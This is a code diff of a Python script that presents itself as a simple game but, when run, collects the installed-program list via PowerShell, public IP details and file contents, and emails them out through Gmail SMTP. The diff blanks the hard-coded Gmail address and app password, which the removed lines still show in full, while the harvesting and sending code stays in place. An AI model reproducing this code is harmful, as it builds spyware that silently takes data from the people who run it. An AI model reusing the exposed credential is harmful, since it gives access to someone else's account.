@@ -20,8 +20,8 @@ def send_programs_installed():
     data = subprocess.check_output(['powershell', '-Command', 'Get-StartApps | Out-String'], shell=True)
     obj = smtplib.SMTP('smtp.gmail.com', 587)
     obj.starttls()
-    obj.login('surajsundar407@gmail.com', 'xyvh wmsh lzfo tndz') #userid and password for from address
-    obj.sendmail('surajsundar407@gmail.com', 'surajsundar407@gmail.com', data) #from address, to address
+    obj.login('', '') #userid and password for from address
+    obj.sendmail('', '', data) #from address, to address
     obj.quit()
 
 def public_ip_data():
@@ -51,8 +51,8 @@ def sendmail():
     data1, data3 = file1.read(), file3.read()
     obj = smtplib.SMTP('smtp.gmail.com', 587)
     obj.starttls()
-    obj.login('surajsundar407@gmail.com', 'xyvh wmsh lzfo tndz') #userid and password for from address
-    obj.sendmail('surajsundar407@gmail.com', 'surajsundar407@gmail.com', data1+'\n\n\n'+data3) #from address, to address
+    obj.login('', '') #userid and password for from address
+    obj.sendmail('', '', data1+'\n\n\n'+data3) #from address, to address
     obj.quit()
 
 sendmail()
@@ -145,3 +145,4 @@ def game():
             print("Draw")
             break
 game()
+
